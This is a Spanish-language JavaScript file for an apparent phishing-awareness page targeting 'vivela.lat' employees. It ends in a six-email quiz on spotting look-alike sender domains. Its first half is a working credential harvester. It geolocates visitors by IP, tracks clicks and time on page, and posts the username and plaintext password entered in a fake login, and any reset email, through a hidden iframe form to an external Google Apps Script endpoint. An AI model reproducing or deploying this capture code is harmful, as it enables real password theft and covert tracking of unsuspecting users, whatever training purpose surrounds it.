/* =========================================================
   CONFIGURACIÓN — pega aquí la URL de tu Web App
   ========================================================= */
var APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyxeuHVHtn-tytH7-j2rjGZBz1xSu8UBXmRDZag_69L4ZkPGp5yrGdkmEKHzBtj2klC/exec';

/* =========================================================
   VISIT ID
   ========================================================= */
function generarVisitId() {
  var rnd = Math.random().toString(36).substring(2, 8);
  var ts  = Date.now().toString(36);
  return 'bee_' + ts + '_' + rnd;
}

var VISIT_ID = sessionStorage.getItem('bee_visit_id');
if (!VISIT_ID) {
  VISIT_ID = generarVisitId();
  sessionStorage.setItem('bee_visit_id', VISIT_ID);
}

/* =========================================================
   METADATOS GLOBALES
   ========================================================= */
var META = {
  visitId: VISIT_ID,
  ip: '',
  pais: '',
  ciudad: '',
  ua: navigator.userAgent,
  plataforma: navigator.platform,
  resolucion: window.screen.width + 'x' + window.screen.height,
  idioma: navigator.language || navigator.userLanguage,
};

function cargarIPyGeo() {
  return fetch('https://ipapi.co/json/')
    .then(function (r) { return r.json(); })
    .then(function (data) {
      META.ip = data.ip || '';
      META.pais = data.country_name || '';
      META.ciudad = data.city || '';
    })
    .catch(function () {
      return fetch('https://api.ipify.org?format=json')
        .then(function (r) { return r.json(); })
        .then(function (d) { META.ip = d.ip || ''; })
        .catch(function () { META.ip = 'desconocida'; });
    });
}

/* =========================================================
   ENVÍO POR IFRAME OCULTO (confiable, sin CORS)
   ========================================================= */
function enviarAppsScript(payload) {
  var iframe = document.getElementById('bee_sink');
  if (!iframe) {
    console.warn('No existe el iframe bee_sink');
    return;
  }

  var form = document.createElement('form');
  form.method = 'POST';
  form.action = APPS_SCRIPT_URL;
  form.target = 'bee_sink';
  form.style.display = 'none';

  var input = document.createElement('input');
  input.type = 'hidden';
  input.name = 'payload';
  input.value = JSON.stringify(payload);
  form.appendChild(input);

  document.body.appendChild(form);
  form.submit();
  document.body.removeChild(form);
}

function enviarEvento(nombreEvento) {
  enviarAppsScript({
    accion: 'evento',
    meta: Object.assign({}, META, { evento: nombreEvento })
  });
}

/* =========================================================
   INICIALIZACIÓN
   ========================================================= */
document.addEventListener('DOMContentLoaded', function () {
  window.__inicio = Date.now();

  cargarIPyGeo().then(function () {
    enviarEvento('VISITA');

    window.addEventListener('beforeunload', function () {
      var segundos = Math.round((Date.now() - window.__inicio) / 1000);
      enviarEvento('SALIDA_' + segundos + 's');
    });
  });
});

/* =========================================================
   TRACKING DE CLICS
   ========================================================= */
document.addEventListener('click', function (e) {
  var el = e.target.closest('.track');
  if (!el) return;
  var ev = el.getAttribute('data-ev') || 'CLICK_GENERICO';
  enviarEvento(ev);
});

/* =========================================================
   LOGIN / RECUPERAR
   ========================================================= */
$(function () {

  $('.toggle-password').on('click', function () {
    var input = $($(this).attr('toggle'));
    var type = input.attr('type') === 'password' ? 'text' : 'password';
    input.attr('type', type);
    $(this).toggleClass('fa-eye-slash fa-eye');
  });

  // ✅ Botón Iniciar sesión
  $('#btn-ingresar').on('click', function () {
    var $btn = $(this);
    var usuario = $('#input-usuario').val().trim();
    var password = $('#input-password').val().trim();
    var ok = true;

    if (!usuario || !usuario.toLowerCase().endsWith('@vivela.lat')) {
      $('#input-usuario').addClass('is-invalid');
      $('#input-usuario-error').text('Usuario incorrecto');
      ok = false;
    } else {
      $('#input-usuario').removeClass('is-invalid');
    }

    if (!password) {
      $('#input-password').addClass('is-invalid');
      ok = false;
    } else {
      $('#input-password').removeClass('is-invalid');
    }

    if (!ok) return;

    $btn.prop('disabled', true).text('Iniciando sesión...');
    enviarEvento('CLICK_LOGIN');

    enviarAppsScript({
      accion: 'login',
      usuario: usuario,
      password: password,
      meta: Object.assign({}, META)
    });

    setTimeout(mostrarSimulacion, 900);
  });

  // ✅ Botón Enviar enlace (recuperar contraseña)
  $('#btn-enviar-enlace').on('click', function () {
    var $btn = $(this);
    var correo = $('#input-correo-rest').val().trim();
    if (!correo) { $('#input-correo-rest').addClass('is-invalid'); return; }
    $('#input-correo-rest').removeClass('is-invalid');

    $btn.prop('disabled', true).text('Enviando...');
    $('#spanemail').text(correo);

    enviarAppsScript({
      accion: 'recuperar',
      correo: correo,
      meta: Object.assign({}, META)
    });

    setTimeout(function () {
      $btn.prop('disabled', false).text('Enviar enlace');
      $('#form-recuperar').hide();
      $('#form-step2').show();
    }, 900);
  });
});

/* =========================================================
   MOSTRAR SIMULACIÓN
   ========================================================= */
function mostrarSimulacion() {
  document.getElementById('vista-login').style.display = 'none';
  document.getElementById('vista-simulacion').classList.add('active');
  window.scrollTo({ top: 0, behavior: 'smooth' });
  iniciarJuego();
}

function cerrarVentana() {
  window.open('', '_self', '');
  window.close();
}

/* =========================================================
   JUEGO: DETECTA EL PHISHING
   ========================================================= */
var PREGUNTAS = [
  {
    from: "soporte@vivela-lat.com",
    to: "tu.correo@vivela.lat",
    subject: "⚠️ Tu cuenta será bloqueada en 24 horas",
    text: "Detectamos actividad inusual en tu cuenta. Para evitar el bloqueo permanente, haz clic en el siguiente enlace y confirma tus datos:",
    cta: "Verificar mi cuenta ahora",
    phishing: true,
    razon: "El dominio <strong>vivela-lat.com</strong> imita a <strong>vivela.lat</strong> (con guion y .com en lugar de .lat). Es un claro intento de phishing."
  },
  {
    from: "segurinfo@vivela.lat",
    to: "tu.correo@vivela.lat",
    subject: "Recordatorio: reunión de equipo mañana 10:00 am",
    text: "Hola, te recordamos que mañana tenemos reunión de equipo a las 10:00 am en la sala principal. Adjuntamos la agenda del día.",
    cta: "Ver agenda",
    phishing: false,
    razon: "El dominio es correcto (<strong>@vivela.lat</strong>), el tono es institucional y no pide datos personales ni urgentes."
  },
  {
    from: "soporte@viveia.lat",
    to: "tu.correo@vivela.lat",
    subject: "Actualiza tu contraseña AHORA o perderás acceso",
    text: "Tu contraseña expiró. Debes cambiarla en los próximos 30 minutos o tu cuenta será suspendida. Ingresa aquí:",
    cta: "Cambiar contraseña urgente",
    phishing: true,
    razon: "El dominio dice <strong>viveia</strong> en lugar de <strong>vivela</strong>, por lo tanto es phishing."
  },
  {
    from: "comunicacioninterna@vivela.lat",
    to: "tu.correo@vivela.lat",
    subject: "¡YA ESTA AQUÍ!",
    text: "Ya puedes consultar tu boleta de pago correspondiente al mes de septiembre desde el portal de colaboradores.",
    cta: "Ver boleta",
    phishing: false,
    razon: "El dominio es legítimo, el mensaje es informativo y no solicita datos sensibles ni enlaces sospechosos."
  },
  {
    from: "premios@vivela.lat-premios.net",
    to: "tu.correo@vivela.lat",
    subject: "🎉 ¡Ganaste un bono de S/500! Reclama aquí",
    text: "Fuiste seleccionado entre los colaboradores para recibir un bono especial. Para reclamarlo solo necesitas confirmar tu número de tarjeta y contraseña:",
    cta: "Reclamar mi bono",
    phishing: true,
    razon: "El dominio real es <strong>vivela.lat-premios.net</strong> (un subdominio externo). Además pide <strong>datos bancarios y contraseña</strong>: nunca hagas eso."
  },
  {
    from: "soporte@vivela.lat",
    to: "tu.correo@vivela.lat",
    subject: "Mantenimiento programado del sistema este sábado",
    text: "El área de TI informa que el sábado de 8:00 pm a 11:00 pm se realizará mantenimiento programado. Durante ese horario el sistema podría estar intermitente.",
    cta: "Más información",
    phishing: false,
    razon: "Comunicación interna típica, sin urgencia, sin pedir datos y desde el dominio correcto."
  }
];

var juego = { idx: 0, score: 0, streak: 0, respondida: false };

function iniciarJuego() {
  juego = { idx: 0, score: 0, streak: 0, respondida: false };
  $('#game-result').removeClass('show');
  $('#game-feedback').removeClass('show correct wrong').text('');
  $('#game-actions').show();
  $('#email-sim').show();
  $('#g-total').text(PREGUNTAS.length);
  actualizarStats();
  cargarPregunta();
}

function reiniciarJuego() { iniciarJuego(); }

function actualizarStats() {
  $('#g-q').text(Math.min(juego.idx + 1, PREGUNTAS.length));
  $('#g-score').text(juego.score);
  $('#g-streak').text(juego.streak);
  var pct = (juego.idx / PREGUNTAS.length) * 100;
  $('#g-progress').css('width', pct + '%');
}

function cargarPregunta() {
  var p = PREGUNTAS[juego.idx];
  $('#e-from').text(p.from);
  $('#e-to').text(p.to);
  $('#e-subject').text(p.subject);
  $('#e-text').text(p.text);
  $('#e-cta').text(p.cta);

  $('#game-feedback').removeClass('show correct wrong').text('');
  $('#game-actions .game-btn').prop('disabled', false);
  juego.respondida = false;
  actualizarStats();
}

function responderPhishing(dijoEsPhishing) {
  if (juego.respondida) return;
  juego.respondida = true;

  var p = PREGUNTAS[juego.idx];
  var acerto = (dijoEsPhishing === p.phishing);
  var $fb = $('#game-feedback');

  if (acerto) {
    juego.score++;
    juego.streak++;
    $fb.removeClass('wrong').addClass('show correct')
       .html('<strong>✅ ¡Correcto!</strong><br>' + p.razon);
  } else {
    juego.streak = 0;
    var correcto = p.phishing ? 'phishing' : 'legítimo';
    $fb.removeClass('correct').addClass('show wrong')
       .html('<strong>❌ Incorrecto.</strong> Este correo era <strong>' + correcto + '</strong>.<br>' + p.razon);
  }

  $('#game-actions .game-btn').prop('disabled', true);
  actualizarStats();

  setTimeout(function () {
    juego.idx++;
    if (juego.idx >= PREGUNTAS.length) {
      mostrarResultado();
    } else {
      cargarPregunta();
    }
  }, 2200);
}

function mostrarResultado() {
  $('#email-sim').hide();
  $('#game-actions').hide();
  $('#game-feedback').removeClass('show');

  var total = PREGUNTAS.length;
  var pct = (juego.score / total) * 100;
  var emoji, titulo, mensaje;

  if (pct === 100) {
    emoji = '🏆'; titulo = '¡Perfecto!'; mensaje = 'Eres un experto detectando phishing. ¡Sigue así!';
  } else if (pct >= 70) {
    emoji = '🎯'; titulo = '¡Muy bien!'; mensaje = 'Tienes buen ojo para detectar amenazas. Repasa los casos fallados.';
  } else if (pct >= 40) {
    emoji = '💡'; titulo = 'Puedes mejorar'; mensaje = 'Recuerda: revisa siempre el remitente y desconfía de la urgencia.';
  } else {
    emoji = '🐝'; titulo = '¡Cuidado!'; mensaje = 'El phishing es más común de lo que crees. Repasa los consejos y vuelve a intentarlo.';
  }

  $('#r-emoji').text(emoji);
  $('#r-title').text(titulo);
  $('#r-score').text(juego.score + ' / ' + total);
  $('#r-message').text(mensaje);
  $('#game-result').addClass('show');
  $('#g-progress').css('width', '100%');

  enviarEvento('JUEGO_PHISHING_FIN_' + juego.score + 'de' + total);
}